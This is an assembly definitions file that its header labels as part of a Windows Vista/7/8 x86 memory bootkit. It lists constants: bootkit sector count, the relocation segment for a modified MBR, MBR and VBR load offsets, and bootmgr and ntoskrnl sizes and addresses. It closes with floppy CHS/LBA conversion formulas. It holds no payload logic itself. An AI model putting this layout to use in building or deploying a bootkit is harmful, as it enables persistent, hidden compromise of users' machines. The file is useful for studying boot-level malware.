; AaLl86 Windows Vista/Seven/Eight x86 Memory Bootkit
; Definitions file

NUM_BOOTKIT_SECTORS = 02h		     ; Number of Sector composing bootkit
CODEBASEIN1MB = 9A00h			     ; Il Segmento in cui copio l'intero MBR modificato
CODEBASEIN1MBEXACT = 9A000h		     ; Indirizzo virtuale Protected Mode in cui è mappato il segmento CODEBASEIN1MB
LOADLOC = 07c00h			     ; MBR Load offset
VBRLOADLOC = 07E00h			     ; VBR Load offset
NTOSKRNL_SIZE = 3C6370h 		     ; Ntoskrnl size (the usage of this SYMBOL is actually wrong)
BOOTMGR_MAX_SIZE = 099A00h		     ; Max bootmgr Size
BOOTMGR_BASE = 0400000h 		     ; Bootmgr Base address
BOOTMGR_EP_RVA = 01000h 		     ; Bootmgr Entry Point Rva



; Floppy drive: 80 chylinders (tracks) * Side, 2 Heads Per Chylinder, 18 Sectors Per Track
; CHS to LBA -  LBA = ((C * HeadsPerChylinder + H) * SectorPerTrack) + S - 1
; LBA to CHS -  cyl = LBA / (HeadsPerChylinder * SectorPerTrack)
;               temp = LBA % (HeadsPerChylinder * SectorPerTrack)
;               head = temp / SectorPerTrack
;               sector = temp % SectorPerTrack + 1
